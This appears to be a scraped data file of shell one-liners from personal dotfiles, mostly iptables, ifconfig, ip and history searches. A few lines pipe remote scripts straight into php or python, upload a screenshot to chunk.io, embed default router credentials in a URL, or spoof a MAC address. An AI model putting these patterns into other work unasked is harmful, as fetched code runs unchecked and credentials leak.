iptables -t nat -L OUTPUT |grep REDSOCKS > /dev/null ; if [ $? == 0 ]; then rs-poff; rs-off ;else rs-on; rs-pon; fi
iptables -nvL --line-numbers | less
iptables -nL | grep $1
iptables -L OUPUT -n --line-number | column -t
iptables -L INPUT -n --line-number | column -t
iptables -L FORWARD -n --line-number | column -t
iptables -L -v -n | grep -e Chain -e DROP
iptables -L -n|grep $ip
iptables -L -n --line-number | column -t
iptables --list -n -v | less -S
ipt -L UDP -n -v --line-numbers | column -t
ipt -L TCP -n -v --line-numbers | column -t
ipt -L OUTPUT -n -v --line-numbers | column -t
ipt -L INPUT -n -v --line-numbers | column -t
ipt -L FORWARD -n -v --line-numbers | column -t
ipt -L -n -v --line-numbers | column -t
ips | grep -v '127.0.0.1'
iplayer --stream 80141 | mplayer -cache 256 -
iplayer --stream 80140 | mplayer -cache 256 -
iplayer --stream 80135 | mplayer -cache 256 -
iplayer --stream 80134 | mplayer -cache 256 -
iplayer --stream 80133 | mplayer -cache 256 -
iplayer --stream 80132 | mplayer -cache 256 -
iplayer --stream 80131 | mplayer -cache 256 -
iplayer --stream 80123 | mplayer -cache 256 -
ipfw pipe list | grep burst
ipcs | grep $USER
ipconfig|gu
ipconfig.exe /all | grep IPv4
ipconfig | nkf -w
ipconfig | iconv -f big5
ipconfig | iconv -f Shift_JIS -t UTF-8
ipconfig | grep IP
ipconfig getifaddr en1; ipconfig getifaddr en1 | pbcopy
ipconfig getifaddr en1 | pbcopy && ipconfig getifaddr en1
ipconfig getifaddr en1 | pbcopy
ipconfig getifaddr en0 | tr -d '\n'
ipconfig getifaddr en0 | tr -d
ipconfig getifaddr en0 | pbcopy && ipconfig getifaddr en0
ipconfig getifaddr en0 | pbcopy && echo 'IP copied'
ipconfig getifaddr en0 | pbcopy
ipconfig getifaddr $(route -n get default|awk '/interface/ { print $2 }')
ipaddr=$(curl -s ipecho.net/plain); echo $ipaddr; echo -n $ipaddr | pbcopy
ip=$(/sbin/ip -o -4 addr list lo | awk
ip | pbcopy
ip route | grep default
ip route | awk '/default/ { print $3 }'
ip route list | grep default
ip route get 8.8.8.8 | awk '{print \$NF; exit}'
ip route get 8.8.8.8 | awk '{print \$5; exit}'
ip route get 8.8.8.8 | awk '{print $NF; exit}'
ip route get 1 | sed -r -n '1{s@.*src[[:space:]]*([^[:space:]]+).*\$@\1@g;p}'
ip route get 1 | awk
ip link show | rg \
ip link show | egrep ib[0-9]+:
ip link show dev eno1 | sed -nre 's@.*link\/ether (\S+).*@\1@p'
ip addr|awk -F\
ip address |grep \
ip address | grep inet
ip addr | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ip addr | grep wlp9s0
ip addr | grep inet; python3 -m http.server
ip addr | grep inet && hostname -i
ip addr | grep inet
ip addr | grep 70.0
ip addr | grep -e 'inet6 ' -e ':\ '
ip addr | grep -e 'inet ' -e ':\ '
ip addr | grep -Po
ip addr | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*'
ip addr | grep --color
ip addr | grep 'inet 192'
ip addr | grep
ip addr | ccze -A
ip addr | awk '/^[0-9]+/ { curriface=\$2 } \$1 == \
ip addr | awk
ip addr | \grep \
ip addr | \\grep -v
ip addr show | grep inet\
ip addr show | grep inet
ip addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
ip addr show eth0 | grep -Eo 'inet [^/]+'
ip addr show eth0 | grep -Eo 'inet [0-9.]+'
ip addr show eth0 | grep 'inet '
ip addr show enp5s0|grep 'inet '
ip addr show enp3s0 | awk
ip addr show docker0 | awk
ip addr show dev wlp3s0 | sed -e's/^.*inet6 \([^ ]*\)\/.*$/\1/;t;d'
ip addr show dev wlp3s0 | ag inet
ip addr show $(primaryif) | sed -e '/^[^ ]/d' -e 's/.*inet \(.*\)\/.*/\1/' -e '/^ /d'
ip a | grep inet
ip a | grep -oP '(?<=inet )[^ ]*'
ip a | grep -o \
ip a | grep
ip a | awk
ip a s|sed -ne '/127.0.0.1/!{s/^[ \t]*inet[ \t]*\([0-9.]\+\)\/.*$/\1/p}'
ip a show dev eth0 | grep
ip -o addr | awk
ip -o addr show | awk
ip -o a l | column -t
ip -o a l scope global | column -t
ip -o a l scope global | awk '{print \$1 \
ip -o -f inet addr show | awk '/scope global/ {print \$4}'
ip -f inet addr show | grep -v valid_lft
ip -br -c link | column -t
ip -br -c address | column -t
ip -4 address show wlp3s0 up | awk '/.*inet.*/ { print \$2 } '
ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
ip -4 addr show docker0 | grep -Po 'inet \K[\d.]+'
ip -4 addr show docker0 | extractip4
ip -4 a show wlp2s0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
ip && ip | pbcopy
iotop -otqqq | grep jbd2
iostat -x | ccze -A
iostat -c -d -k|m -t -x [ interval [ count ] ]
iostat -Dl | awk '/hdiskpower/ && $2 > 60 { print $0 } '
iostat $(lsblk --nodeps -n -o name --include 8 |sort)
ioreg -w0 -l | grep Capacity
ioreg -w0 -l | grep -i IOBatteryInfo
ioreg -w0 -c AppleSmartBattery -b -f | grep -i capacity
ioreg -p IODeviceTree -n 'battery' -w 0 | grep Battery
ioreg -n BNBMouseDevice | grep -i BatteryPercent
ioreg -n BNBMouseDevice | grep -i Battery
ioreg -l | grep IOPlatformSerialNumber
ioreg -l -w0 |grep Capacity
ioreg -l -w 0 | grep IOBatteryInfo
ioreg -c AppleBluetoothHIDKeyboard |grep BatteryPercent
ioreg -c AppleBluetoothHIDKeyboard |grep Battery
inxi -Fxz ; sudo dmidecode | grep DDR -C 10
inxi -FdflmpuxszBnxxx -xt c -xt m -c 0 | less
inxi -F | ccze -A
int.infix '|'
instfix -i|grep SP
instfix -i|grep ML
installedhome | less
installed-node-version | tail -n 1
install-base; mkdir -p $base/tools; rm $base/tools/n98-magerun.phar;wget -O $base/tools/n98-magerun.phar https://files.magerun.net/n98-magerun.phar; chmod +x $base/tools/n98-magerun.phar; mkdir -p ~/.n98-magerun/modules/ && git clone git@github.com:kalenjordan/magerun-addons.git ~/.n98-magerun/modules/magerun-addons ; git clone https://github.com/peterjaap/magerun-addons.git ~/.n98-magerun/modules/magerun-addons2; git clone https://github.com/Hypernode/hypernode-magerun.git ~/.n98-magerun/modules/hypernode-magerun ; git clone https://github.com/steverobbins/magedownload-cli ~/.n98-magerun/modules/magedownload-cli && cd ~/.n98-magerun/modules/magedownload-cli/ && curl -sS https://getcomposer.org/installer | php && php composer.phar install; cd ../ ; git clone git@github.com:AOEpeople/mpmd.git ~/.n98-magerun/modules/mpmd; clear; cd ~/
install-base; cd $base;mkdir tools; cd tools; composer.phar;apt-get install curl -y;curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer;clear;cd ~/
inotifywait -m -r -e close_write --exclude '.*.sw[a-z]' src/ | while read line; do make; done
inline | pbcopy
init_v25dev ; echo /export/home/ftarroux/svn_extract/v25dev | ns_instal.unix
infocmp st-256color | ssh dimea 'mkdir -p .terminfo && cat >/tmp/ti && tic /tmp/ti'
info $1 | less
impostor firewall | bash - & impostor server & impostor tray &
import png:- |xclip -selection clipboard -t image/png
import png:- | xclip -selection clipboard -t image/png
import png:- | xclip -selection c -t image/png
import png:- | curl -T- -s chunk.io
imount | column -t
il -n1|sed -e "
iiread $1 | tail -n 10
ifocnfig | grep inet
ifiles | xargs grep $@
ifconfig|sed 's/inet addr:\([0-9.]*\)/inet addr:[1;37;48;5;19m\1[0;39;49m/'
ifconfig|less
ifconfig|grep inet
ifconfig|grep broadcast
ifconfig|grep \
ifconfig|grep 192.168
ifconfig|grep 'inet addr'
ifconfig|grep 'inet '
ifconfig|grep
ifconfig| grep inet
ifconfig2 | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig |grep inet
ifconfig |grep 'inet addr'
ifconfig | sed -n -e 's/127\.0\.0\.1 //g' -e 's/ *inet \([0-9.]*\).*/\1/gp'
ifconfig | sed -n 's/.*inet addr:\([0-9.]\+\)\s.*/\1/p'
ifconfig | sed -n '/inet /p'
ifconfig | sed -En 's/128.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'; dig +short myip.opendns.com @resolver1.opendns.com
ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig | sed -En 's/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig | sed -En
ifconfig | rainbow -f ifconfig
ifconfig | perl -ne '/^\s*inet addr/ and print'
ifconfig | perl -ne '/^\s*inet (?:addr)?/ and print'
ifconfig | pcregrep -M -o
ifconfig | more
ifconfig | less
ifconfig | ipgrep
ifconfig | igrep inet
ifconfig | h -i $H_IFCONFIG addr eth0 lo inet6 inet inactive active 192 168 127.0.0.1 $AXL_IP_PORT $AXL_IP_MASK
ifconfig | grep wlan0 > /dev/null
ifconfig | grep net
ifconfig | grep inet\\b
ifconfig | grep inet\ end
ifconfig | grep inet\ 1
ifconfig | grep inet\
ifconfig | grep inet; python -m SimpleHTTPServer
ifconfig | grep inet; curl ip.cn
ifconfig | grep inet ; python -m SimpleHTTPServer 8080
ifconfig | grep inet && ping -c3 www.gentoo.org
ifconfig | grep inet
ifconfig | grep hwaddr -i
ifconfig | grep cast
ifconfig | grep broadcast\
ifconfig | grep broadcast
ifconfig | grep ask
ifconfig | grep ^carp -A 2
ifconfig | grep \
ifconfig | grep HWaddr
ifconfig | grep Ethernet
ifconfig | grep 192\.168\.
ifconfig | grep 192.168.0.
ifconfig | grep 192.168
ifconfig | grep 192.*
ifconfig | grep 192 && python3 -m http.server
ifconfig | grep 192
ifconfig | grep -o \
ifconfig | grep -o 'inet.*netmask'
ifconfig | grep -i inet
ifconfig | grep -i
ifconfig | grep -e 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*'
ifconfig | grep -e
ifconfig | grep -P '(?<=inet addr:)192\.168\.[0-9]+\.[0-9]+' -o
ifconfig | grep -Eo \
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*'
ifconfig | grep -Eo
ifconfig | grep -E `xxregxmac`
ifconfig | grep -E `xxregxip`
ifconfig | grep -C 2 -i inet
ifconfig | grep -B 6 ' active'
ifconfig | grep -A 1 \
ifconfig | grep --color=none inet
ifconfig | grep --color -o 'inet 1[079][^ ]*'; python -m CGIHTTPServer 8000
ifconfig | grep --color
ifconfig | grep 'inet'
ifconfig | grep 'inet addr:'
ifconfig | grep 'inet addr'
ifconfig | grep 'inet 192.168'
ifconfig | grep 'inet 192.'
ifconfig | grep 'inet ';curl https://ipinfo.io; echo
ifconfig | grep 'inet ' -B1
ifconfig | grep 'inet '
ifconfig | grep 'broadcast'
ifconfig | grep '10\\.'
ifconfig | grep
ifconfig | egrep \
ifconfig | awk -v RS=\
ifconfig | awk '\$1 == \
ifconfig | awk '/inet / {print \$2}'
ifconfig | awk '/inet / { print \$2 }'
ifconfig | awk '/broadcast/ { print \$2 }'
ifconfig | awk '$1 == \
ifconfig | awk
ifconfig | ag 192\.168
ifconfig | ack -o \
ifconfig | ack -o
ifconfig | ack 'net'
ifconfig wlp61s0 | grep \
ifconfig wlp58s0 | sed -n '2s/[^:]*:\([^ ]*\).*/\1/p'
ifconfig wlp58s0 | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig wlan0 | sed -n 's/^.*addr:\(.*\) Bcast.*$/\1/p'
ifconfig wlan0 | grep 'inet addr' && python -m SimpleHTTPServer 8000
ifconfig eth0 | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig eth0 | grep inet
ifconfig eth0 | grep 'bytes'
ifconfig en3 | grep inet\
ifconfig en3 | grep -w inet
ifconfig en3 | grep -w ether
ifconfig en1 | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig en1 | grep ether
ifconfig en1 | grep \
ifconfig en1 | awk '/inet/{print $2}'
ifconfig en1 | awk '/ether/{print $2}'
ifconfig en0|awk '/inet / { print $2 }'
ifconfig en0| sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig en0 | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig en0 | grep inet\
ifconfig en0 | grep inet
ifconfig en0 | grep ether
ifconfig en0 | grep \
ifconfig en0 | grep -w inet
ifconfig en0 | grep 'inet'
ifconfig en0 | grep 'inet '
ifconfig en0 | grep
ifconfig en0 | egrep -o '([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)'
ifconfig en0 | awk '\$1 == \
ifconfig en0 | awk '/broad/'
ifconfig en0 | awk '$1 ==
ifconfig en0 | awk
ifconfig en0 | \grep -Eo '[0-9a-f:]{17} '
ifconfig en0 inet | awk '/inet/{print \$2}'
ifconfig en0 ether $(openssl rand -hex 6 | sed 's%\(..\)%\1:%g; s%.$%%')
ifconfig -a|\grep -E '\d*\.\d*\.\d*\.\d*'
ifconfig -a | perl -nler'/(\d+\.\d+\.\d+\.\d+)/ && print $1'
ifconfig -a | perl -nle\
ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/&&print$1'
ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ and print $1'
ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ &amp;&amp; print $1'
ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print \$1'
ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print ${1}'
ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1'
ifconfig -a | perl -nle'/(\d+\.\d+.\d+.\d+)/ && print $1'
ifconfig -a | perl -nle'/(\d+.\d+.\d+.\d+)/ && print $1'
ifconfig -a | perl -nle'/(\\d+\\.\\d+\\.\\d+\\.\\d+)/ && print'
ifconfig -a | perl -nle'/(\\d+\\.\\d+\\.\\d+\\.\\d+)/ && print $1'
ifconfig -a | perl -nle'/((\d+\.){3}\d+)/ && print \$1'
ifconfig -a | perl -nle '/(\d+\.\d+\.\d+\.\d+)/ && print \$1'
ifconfig -a | grep inet
ifconfig -a | grep ether
ifconfig -a | grep -o
ifconfig -a | awk -f ~/.scripts/iface-filter.awk
ifconfig -a | awk
ifconfig -a inet | grep -A 1 en.:
ifconfig -a inet | awk '/inet/ {print $2}'
if wicd-cli -y -d | grep Invalid > /dev/null;then wicd-cli -cy -n 0;curl 'http://admin:admin@192.168.1.1/userRpm/StatusRpm.htm?Connect=%C1%AC%20%BD%D3&wan=1' >> /dev/null; fi
if tmux list-sessions|grep piano;then tmux attach -t piano; else tmux new -s piano -d \; new-window
if ssh-add -l > /dev/null ; then : ; else for i in `ls ~/.ssh/id_rsa* | grep -v pub` ; do ssh-add $i ; done ; fi
if screen -list | grep -q 'michalm-screen1'; then if [ $(id -u) = 0 ]; then su -c 'screen -X -S michalm-screen1 quit' michalm; else screen -X -S michalm-screen1 quit; fi; fi; screen -c ~michalm/x/.xscreenrc -S michalm-screen1 -D -RR
if mount | grep ~/helios > /dev/null; then echo \
if mount | grep ~/graham > /dev/null; then echo \
if mount | grep ~/cedar > /dev/null; then echo \
if mount | grep ~/beluga > /dev/null; then echo \
if ls -l ./main.cpp | grep ^l ; then echo 1; else echo 0; fi
if jobs | grep vim > /dev/null; then fg vim; else vim; fi'
if git stash | grep -v \
if [[ -z $(docker ps|grep tomastomecek/sen) ]]; then docker run --privileged -v /var/run/docker.sock:/run/docker.sock -ti -e TERM tomastomecek/sen; fi
if [[ -x `which cdiff 2>/dev/null` ]]; then; git diff $@ | cdiff -s; else; git diff $@; fi
if [[ -n `netstat -an | grep 127.0.0.1.4443` ]] then open https://local.appno.net:4443 ; else ssh vanops.appno.net -fnN -L 4443:localhost:4443 && open https://local.appno.net:4443; fi
if [%(git-staging-file-list | wc -l) -gt 1]be rubocop -a $(git-staging-file-list); ga $(git-staging-unstaging-file-list)
if [ `nmcli -t -f ssid dev wifi| cut -d\' -f2` ==
if [ \$(git branch 2> /dev/null | wc -l) -ge 1 ] ; then echo '('\$(__git_ps1)') '; fi
if [ \$(docker images -q --filter dangling=true | wc -l) -gt 0 ] ; then ; docker rmi -f \$(docker images -q --filter dangling=true) ; fi
if [ $(tmux ls|wc -l) > 0 ]; then tmux new -A -s main; else tmux attach;fi
if ( lsmod | grep -q vbox ) ; then ( virtualbox > /dev/null 2>&1 & ); else (sudo modprobe vboxdrv && virtualbox > /dev/null 2>&1 ); fi
if ! watson_is_on; then watson remove -f $(watson frames | tail -n 1); else return 1; fi
if ! [[ $(spotify status | grep paused) ]]; then spotify pause; fi && open -a ScreenSaverEngine.app
idevicesyslog | grep
idevicepair pair | ifuse /media/iPhone
identify -verbose $1 | grep Interlace
id && hostname && ifconfig | grep inet && uptime
iconv -sf UTF-8 -t CP932 | clip
iconv -f utf8 -t cp852//TRANSLIT | iconv -f cp437 -t utf8
iconv -f cp437 -t utf8 *.nfo | less -Q
iconv -f UTF-8 -t CP932 | /c/Windows/System32/clip.exe
iconv -f UTF-16 -t UTF-8 | grep
iconv -c -f utf-8 -t ascii report.csv | tail -n +2 > stripped.csv
iconv -c -f UTF-8-MAC -t UTF-8 | grep
iconr . . -avNnokSd -c=i.icon.icon- | sed 's#\.i\.icon\.#i\.icon\.#g' > _iconz.css
ibmcloud ks clusters -s | awk
iap_curl $(iap_curl --list | fzf --height 30% --reverse)
i=0;while true; do if ((i%60==0)); then echo; fi; if ((i%720==0)); then date;((i=0)); fi; ps aux | grep -E
i3lock -ni <(import -window root -silent png:- | convert png:--scale 10% -scale 1000% png:-) &>dev/null
i3lock -i $(find ~/Pictures/Backgrounds/carWindowRainy.png -type f| shuf -n 1)
i3-msg -t get_workspaces | sed -r 's/.*\
i3-msg -t get_tree | jq
h|rg
h|less
h|grep vi\
h|grep make\
h|grep cp\
h|grep
h|g
h|ag
hxnormalize -x | hxselect -c
hxnormalize -x 2> /dev/null | hxselect -c
hwinfo --gfx | grep 'Driver Status'
hubdown README.md -w | browser
hub pull-request | open
hub pull-request | clip
hub pull-request -m 'pcobb PR' | xargs open
hub pull-request -d --no-edit | tee >(xclip)
hub pr list -L 20 -b develop --format='%t [%H] | %U%n'
hub ls-files -i --exclude-from=.gitignore | xargs hub rm --cached
hub log | ack
hub log --oneline --color --decorate | emojify
hub diff --ignore-space-change | gitx --diff
hub ci-status --color -v | sed 's/?.*$//g'
hub browse $(zplug list | fzf)
hub browse $(ghq list | peco)
hub branch --list --color | cat
https://api.github.com/user/repos | grep -o 'https://github.com[^\"
httpd -V | grep httpd.conf
http icanhazip.com --body | sed ':a;N;$!ba;s/\n/ /g'
http https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -
http https://ifconfig.co/json | jq .
http http://www.cic.gc.ca/english/work/iec/data.xml | xpath \
http -b wttr.in | head -n38
htop | lolcat
htop -p \$(ps -ef | grep \
htop -p 0 | head
htop -p $(pgrep Python | python -c
html2text.py $@ | less
html-minifier | php -r \
hs | grep
hr | lolcat
hr | grep
hpath | fzf
hostname|grep uDH
hostname | pbcopy
hostname -f | sed 's/.*\.\([^.]\+\)\.arm\.com/\1/'
hostname -I | xargs echo -n
hostname -I | tr ' ' '\n'
hostname -I | cut -d' ' -f1
hostname -I | cut -d ' ' -f 1
hostname -I | awk '{print \$1}'
hostname -I | awk '{print $1}'
hostapd_cli status 2> /dev/null | grep state=ENABLED
host ong | awk -F
host myip.opendns.com resolver1.opendns.com | grep \
host -l us.tandbergtv.com | grep
homecff Fribourg | dmenu
homecff Charmettes | dmenu
hogs|tail
hn -c | less
hmm clean && yes n | hmm install
hledger balance '^assets:(bank|cash)'
hjls | grep 'rong'
hi|grep
hist|grep $1
hist|grep
history|tail>>~/cmds
history|tail -n15
history|tail -n10
history|tail -n 40
history|tail -n 30
history|tail -n 25
history|tail -n 20
history|tail -44
history|tail -40
history|tail -30
history|tail -24
history|tail -20
history|tail -100
history|tail -10
history|tail
history|more
history|less +G
history|less
history|grp
history|grepc
history|grep ssh
history|grep git
history|grep -n2 $1
history|grep -i -e
history|grep -i --color=AUTO
history|grep -i
history|grep -a
history|grep -C5
history|grep --color=auto
history|grep --color
history|grep $1
history|grep $*
history|grep
history|g
history|fgrep -i
history|egrep
history|cut -d ' ' -f 5-
history|awk '{print \$4\
history|awk
history|agg
history|ag
history|'grep'
history| grep docker
history| grep
history| egrep
history|
history-all | peco
history-all | less
history-all | grep --color=auto
history-all | grep
history |tail -n 10
history |tail
history |rg
history |less
history |grep python
history |grep -i
history |grep ${*}
history |grep $1
history |grep
history |gp
history |egrep -i
history |ccze -A
history |awk -F
history | ~/bin/gpfilter.py
history | ~/.zoomq/bin/top10cli.sh
history | vim -
history | tail'
history | tail -n50
history | tail -n30
history | tail -n20
history | tail -n 9
history | tail -n 75
history | tail -n 60
history | tail -n 50
history | tail -n 300
history | tail -n 30
history | tail -n 3
history | tail -n 25
history | tail -n 24
history | tail -n 23
history | tail -n 21
history | tail -n 20
history | tail -n 12
history | tail -n 100
history | tail -n 10
history | tail -n $LINES
history | tail -n $(($LINES - 4))
history | tail -n
history | tail -80
history | tail -58
history | tail -56
history | tail -50
history | tail -5
history | tail -40
history | tail -35
history | tail -30
history | tail -28
history | tail -25
history | tail -23
history | tail -200
history | tail -20
history | tail -15
history | tail -100
history | tail -10
history | tail
history | sort
history | sed \
history | sed -e 's/^[ ]*[1-9][0-9]*[ ]*//'
history | sed -e
history | sed 's/^[ ]*[0-9]\+[ ]*[0-9]\+:[0-9]\+[ ]*//'
history | sed 's/^[ ]*[0-9]\+[ ]*//'
history | sed
history | rg -i $
history | rg --smart-case
history | rg --color=auto
history | rg
history | red-grep
history | rawless
history | quick-alias $1
history | pygmentize -g
history | philog -history
history | percol
history | peco
history | nvim -
history | node ~/.bash/scripts/history.js
history | more
history | m
history | lolcat
history | less'
history | less -n
history | less -RSFXin
history | less -Fe +G
history | less +G --
history | less +G
history | less
history | le
history | igrep
history | head -n 5
history | head -n 15
history | head -n $1
history | grepi
history | grepe
history | grep'
history | grep vim
history | grep ssh
history | grep push
history | grep npm
history | grep grep
history | grep git
history | grep ctest
history | grep cp
history | grep \$1
history | grep \!*
history | grep \
history | grep 2>/dev/null
history | grep -v
history | grep -ia
history | grep -iP --color
history | grep -iP
history | grep -iE \
history | grep -i -e VSZ -e
history | grep -i --color=auto
history | grep -i --color=always $1
history | grep -i --color=always
history | grep -i --color
history | grep -i $@
history | grep -i $1
history | grep -i $*
history | grep -i
history | grep -e
history | grep -Pi
history | grep -P
history | grep -I
history | grep -Ei --color=auto
history | grep -Ei
history | grep -E -i
history | grep -E
history | grep -A 10 -B 1
history | grep --colour
history | grep --color=auto wal -i
history | grep --color=auto -i
history | grep --color=auto $1
history | grep --color=auto
history | grep --color=always
history | grep --color
history | grep --
history | grep 'defaults write'
history | grep 'defaults delete'
history | grep '$1'
history | grep '
history | grep ${1}
history | grep $@
history | grep $1
history | grep $0
history | grep $*
history | grep
history | gr
history | gi
history | gg
history | g $1
history | g
history | fzf > selected
history | fzf -e
history | fzf --tac --no-sort
history | fzf --reverse
history | fzf
history | fgrep -i
history | fgrep $1
history | fgrep
history | ep
history | egrep -i \!*
history | egrep -i
history | egrep --colour=auto -e'
history | egrep --color=auto
history | egrep --color
history | egrep
history | cut -f 2- -d \
history | cut -c8-
history | cut -c 8-999
history | cut -c 8-
history | cut -c 26-
history | cut -c 21-
history | command less +G
history | cgrep -i $1
history | ccze -A
history | catOrLessG
history | awk '{print \$2 \
history | awk '{a[\$4]++ } END{for(i in a){print a[i] \
history | awk '{a[\$2]++}END{for(i in a){print a[i] \
history | awk '{a[\$2]++}END{for(i in a){print a[i]
history | awk '{a[\$2]++} END{for(i in a){printf \
history | awk '{a[\$2]++} END {for(i in a){print a[i] \
history | awk '{a[\$2]++ }END{for(i in a){print a[i]
history | awk '{a[\$2]++ } END{for(i in a){print a[i] \
history | awk '{a[$2]++}END{for(i in a){print a[i] \
history | awk '{a[$2]++}END{for(i in a){print a[i]
history | awk '{a[$2]++}END{for (i in a){print a [i] \
history | awk '{\$1=\$2=\$3=\
history | awk '{\$1=\
history | awk '{CMD[\$2]++;count++;}END{for(a in CMD)print CMD[a] \
history | awk '{CMD[\$2]++;count++;}END { for (a in CMD)print CMD[a] \
history | awk '{CMD[\$2]++;count++;} END { for (a in CMD) print CMD[a] \
history | awk '{CMD[\$2]++; count++} END { for (x in CMD)print CMD[x] \
history | awk '{CMD[\
history | awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a]
history | awk '{CMD[$2]++;count++;} END { for (a in CMD )print CMD[a]
history | awk '{ print \$4 }'
history | awk '{ \$1=\
history | awk 'BEGIN {FS=\
history | awk
history | ag -o
history | ag
history | ack -i
history | ack $1
history | ack
history | a
history | _history_trim_timestamp
history | \egrep -i
history | ?
history | >> history.txt
history | /usr/local/bin/grep -i --color=always
history | /usr/bin/grep
history | ./mgs #
history | ${GREPPAGE} -i
history | $PAGER
history \!* | more
history \!* | less
history 500 | grep --color=auto --ignore-case
history 50 | less
history 40 |awk '{print \$2\
history 40 | sed -e 's/^ *[^ ]* //' >> timm.history
history 40 | grep -v hist
history 200 | grep
history 200 | awk '{a[\$2]++}END{for(i in a){print a[i] \
history 1|grep
history 1| peco
history 1000 | grep
history 100 | grep cd
history 100 | grep
history 1 |grep -i
history 1 |g
history 1 | vim -R -
history 1 | peco
history 1 | less +G
history 1 | less
history 1 | igrep
history 1 | grep -i
history 1 | grep $@
history 1 | grep $1
history 1 | grep $*
history 1 | grep
history 1 | cut -c 8-
history 1 | ag
history 1 -1 | less
history 1 -1 | grep
history 1 -1 | ag
history 0|grep -i
history 0|grep
history 0|fzf
history 0| grep -i
history 0 |grep --color=auto
history 0 | rg
history 0 | less
history 0 | grep -nr
history 0 | grep -i
history 0 | grep -E
history 0 | grep --color
history 0 | grep
history 0 | egrep
history 0 | cut -c 8-
history 0 | awk \
history 0 | awk
history 0 | ag
history -r | head
history -p \!\! | xclip -sel c
history -p '!!' | putclip
history -p !! | xsel -ib
history -nir 0 | less
history -n | peco
history -n 20 | ccze -A
history -n 100 | mgrep -i
history -n 1 | grep
history -n 1 | $EDITOR - +
history -n -r 1 | fzf
history -n -1000 | $EDITOR - +
history -ir | uniq -f 4
history -iDf 0 | less -X +\>
history -i | tail -n
history -i 1 | tail -50
history -i 1 | rg
history -i 1 | peco
history -i 1 | less +G
history -i 1 | less
history -i 1 | grep
history -i 1 | ag
history -i -n 0 | grep
history -i -E 1 | peco
history -i -100 | less
history -fd 0 | grep
history -f 1 | less +G
history -d 1 | egrep
history -a;history -n;history | grep
history -a; history -n; history | grep
history -a; history -n; cat ~/.bash_history | sed
history -a && grep '^ *[0-9]* *cd ' ~/.bash_history| tail -10 >>~/.bash_history && history -r ~/.bash_history
history -Ei 1 | grep
history -E | ag
history -E 1| grep
history -E 1 | less
history -E 1 | grep -i
history -E 1 | grep -E
history -E 1 | grep $1
history -E 1 | grep
history -E -i 1 | grep
history -E -i 1 | fzf
history -99999 | cut -c 8-
history -5000 | grep
history -5000 | glark
history -500 |grep
history -10000 | grep
history -1000 | grep -i
history -1000 | grep
history -1000 | ag
history -1 | clip
history -1 | awk '{\$1=\
history -$((LINES - 3))|sort -r
history $@ | less
history $* | $PAGER +G
histmd | clip
histall | grep
his | sed 's/^.*:[0-9][0-9]] //'
his | less
his | grep
his | fgrep
his 1000 | grep
highlight -O rtf ~/highlight.yml | pbcopy
highlight -O rtf ~/highlight.php | pbcopy
highlight --syntax=php --style=seashell -O rtf | pbcopy
highlight --syntax=js --style=seashell --line-numbers -O rtf | pbcopy
highlight --syntax diff | less
hidden -c | showhidden --all
hidden -c | showhidden
hi | grep -i
hi | grep
hi | T
hh| grep -i $@
hh| grep $@
hh | grep
hh hg glog --template '{rev} ({author|email}): {desc}\n' -l
hg | tail -n 5
hg | tail -n 1
hg tags|head -n 2
hg tags | less
hg status -un `hg root` | xargs rm -f
hg status -an0 |xargs -0 hg revert
hg status -an0 | xargs -0 hg revert
hg st | grep M
hg st -un0 | xargs -0 rm
hg sglog|head -50
hg sglog|head -43
hg sglog | less -R
hg sglog | less
hg serve | sensible-browser http://localhost:8000/graph
hg qdiff | less
hg qdiff --color=always | less -R
hg outgoing -v | lf
hg log|less
hg log |grep changeset
hg log | less
hg log | head -n 20
hg log -r .^ --template '{desc|firstline}'
hg log -l 4 | grep summary
hg log -l 4 | grep changeset
hg log -l 20 -G | less
hg log -G -l9 | less
hg log --style changelog |less
hg log --no-merges --style ~/dotfiles/hg/map-cmdline.slog | less
hg log --no-merges --style ~/dotfiles/hg/map-cmdline.slog default..tip | less
hg log --limit 10 --template '{rev}: {desc|firstline}\n'
hg log --graph | less
hg log --color=always | less
hg log --color always | less -R
hg locate | xargs grep -EIi -e
hg incoming | more
hg incoming mainline | more
hg incoming -v | lf
hg gl|less
hg glog | less
hg glog | l
hg glog --style=compact --color=always | less
hg glog --color=always | less -R
hg diff|less
hg diff |pygmentize -ldiff
hg diff | mate
hg diff | less
hg diff | $GIT_EDITOR -
hg diff -w | less
hg diff -p | nvim -R -
hg diff -U0 -r '.^' -r . | clang-format-diff.py -p 2 -i
